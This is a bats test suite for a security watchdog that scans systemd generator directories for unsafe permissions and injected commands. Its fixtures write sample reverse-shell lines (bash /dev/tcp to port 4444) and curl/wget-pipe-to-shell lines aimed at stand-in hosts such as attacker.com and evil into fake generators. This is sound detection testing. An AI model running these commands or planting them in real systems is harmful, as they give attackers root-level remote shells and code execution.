#!/usr/bin/env bats
# L2 bats functional tests for the systemd-generator-watchdog scan script.
#
# systemd runs the executables in its generator dirs (system-generators /
# user-generators) AS ROOT very early at every boot and on `daemon-reload`,
# before most services start — one of the earliest, most powerful root-exec
# surfaces (T1546). A generator that is world-writable / non-root-owned, or a
# text generator containing a command-injection pattern, is alert.
#
# Run with: bats packaging/test/L2-systemd-generator-watchdog.bats

WD="${BATS_TEST_DIRNAME}/../../modules/systemd-generator-watchdog/systemd/systemd-generator-watchdog.sh"
LIB="${BATS_TEST_DIRNAME}/../lib/module-lib.sh"

setup() {
    TMP="$(mktemp -d)"
    BIN="${TMP}/bin"; mkdir -p "${BIN}"
    cat > "${BIN}/logger" <<'FAKELOGGER'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "${SELFDEF_TEST_LOGCAP}"
FAKELOGGER
    chmod +x "${BIN}/logger"
    export SELFDEF_TEST_LOGCAP="${TMP}/log.out"
    : > "${SELFDEF_TEST_LOGCAP}"
    BASELINE="${TMP}/baseline.tsv"
    GEND="${TMP}/system-generators"; mkdir -p "${GEND}"
}

teardown() { rm -rf "${TMP}"; }

run_wd() {
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_SDGEN_PROFILE="${PROFILE:-report}" \
    SELFDEF_SDGEN_BASELINE="${BASELINE}" \
    SELFDEF_SDGEN_DIRS="${DIRS_V:-$GEND}" \
    bash "${WD}"
}

cap() { cat "${SELFDEF_TEST_LOGCAP}"; }

seed_benign() {
    printf '#!/bin/sh\n# systemd-fstab-generator shim\nexit 0\n' > "${GEND}/my-generator"
    chmod 0755 "${GEND}/my-generator"
}

@test "no generator dirs → ok / no_generator_dirs" {
    DIRS_V="${TMP}/empty" run_wd
    cap | grep -q '"event":"no_generator_dirs"'
    cap | grep -q '"severity":"ok"'
}

@test "benign generator, first run → ok / baseline_initial" {
    seed_benign
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -q '"severity":"ok"'
    [ -f "${BASELINE}" ]
}

@test "unchanged generators on second run → ok / systemd_generator_intact" {
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"systemd_generator_intact"'
    cap | grep -q '"severity":"ok"'
}

@test "a generator containing an injection pattern → alert / systemd_generator_suspicious" {
    seed_benign
    run_wd
    printf '#!/bin/sh\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n' > "${GEND}/my-generator"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"systemd_generator_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "a world-writable generator → alert" {
    seed_benign
    run_wd
    chmod 0666 "${GEND}/my-generator"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "a benign generator change → warn / systemd_generator_changed" {
    seed_benign
    run_wd
    printf '#!/bin/sh\n# updated shim\ntrue\n' > "${GEND}/my-generator"
    chmod 0755 "${GEND}/my-generator"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -qE '"event":"systemd_generator_(changed|new)"'
    cap | grep -q '"severity":"warn"'
}

@test "a benign root-owned generator is NOT flagged" {
    seed_benign
    run_wd
    ! cap | grep -q '"severity":"alert"'
    cap | grep -q '"severity":"ok"'
}

@test "missing module-lib → alert / module_lib_missing + non-zero exit" {
    seed_benign
    LIB="${TMP}/nonexistent-module-lib.sh" run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"event":"module_lib_missing"'
    cap | grep -q '"severity":"alert"'
}

@test "enforce profile exits non-zero on a suspicious generator" {
    seed_benign
    run_wd
    printf '#!/bin/sh\ncurl http://evil/p|sh\n' > "${GEND}/my-generator"
    : > "${SELFDEF_TEST_LOGCAP}"
    PROFILE=enforce run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"severity":"alert"'
}

@test "baseline is chmod 0600 (confidentiality — generator inventory enumerates early-boot root-exec surface)" {
    seed_benign
    run_wd
    [ "$(stat -c '%a' "${BASELINE}")" = "600" ]
}

@test "INVARIANT (reverse-shell pattern): /dev/tcp reverse shell in generator → alert" {
    seed_benign
    run_wd
    printf '#!/bin/sh\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${GEND}/my-generator"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (wget-pipe-sh): wget bootstrap variant in generator → alert" {
    seed_benign
    run_wd
    printf '#!/bin/sh\nwget -qO- http://attacker/p | sh\n' > "${GEND}/my-generator"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (base64-decode-pipe): obfuscation variant in generator → alert" {
    seed_benign
    run_wd
    printf '#!/bin/sh\necho YmFzaCAtaQ== | base64 -d | bash\n' > "${GEND}/my-generator"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (group-writable generator): group-writable → alert above world-writable bar" {
    seed_benign
    run_wd
    chmod 0664 "${GEND}/my-generator"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (pre-existing world-writable generator): baseline_initial fires alert at install-time" {
    seed_benign
    chmod 0666 "${GEND}/my-generator"
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "DELTA detect — ADDED generator (attacker drops a new system-generators executable) surfaces in sample" {
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/sh\necho "new"\n' > "${GEND}/distinctive-attacker-generator"
    chmod 0755 "${GEND}/distinctive-attacker-generator"
    run_wd
    cap | grep -q 'distinctive-attacker-generator'
}

@test "JSON record is emitted as a SINGLE main logger line (downstream JSON-line consumer contract)" {
    seed_benign
    run_wd
    main_count=$(cap | grep -cE '^-t selfdef-systemd-generator -- ')
    [ "${main_count}" = "1" ]
}

@test "INVARIANT (no auto-trust): systemd-generator-watchdog does NOT refresh baseline on injection detection — alert STAYS until operator updates" {
    # T1546 early-boot root-exec persistence — injection alert MUST
    # persist across runs until operator explicitly re-baselines.
    seed_benign
    run_wd
    printf '#!/bin/sh\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${GEND}/my-generator"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # first delta — alert
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # alert STAYS
    cap | grep -q '"event":"systemd_generator_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (commented injection pattern NOT flagged: # prefix filtered)" {
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/sh\n# systemd-fstab-generator shim\n# example attack: bash -i >& /dev/tcp/evil.com/4444 0>&1\nexit 0\n' > "${GEND}/my-generator"
    chmod 0755 "${GEND}/my-generator"
    run_wd
    ! cap | grep -q '"event":"systemd_generator_suspicious"'
    ! cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (multi-dir scan: /lib/systemd/system-generators + /etc/systemd/system-generators + /run axes — injection in ANY → alert)" {
    # systemd reads generators from MULTIPLE dirs. Attacker may plant
    # in any. Lock multi-dir axis.
    GEND2="${TMP}/etc-system-generators"; mkdir -p "${GEND2}"
    seed_benign
    DIRS_V="${GEND} ${GEND2}" run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    # Plant injection in second dir.
    printf '#!/bin/sh\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${GEND2}/evil-generator"
    chmod 0755 "${GEND2}/evil-generator"
    DIRS_V="${GEND} ${GEND2}" run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (curl-pipe-bash variant — bash subshell — also detected)" {
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/sh\ncurl -s http://attacker.com/p | bash\n' > "${GEND}/my-generator"
    chmod 0755 "${GEND}/my-generator"
    run_wd
    cap | grep -q '"severity":"alert"'
}
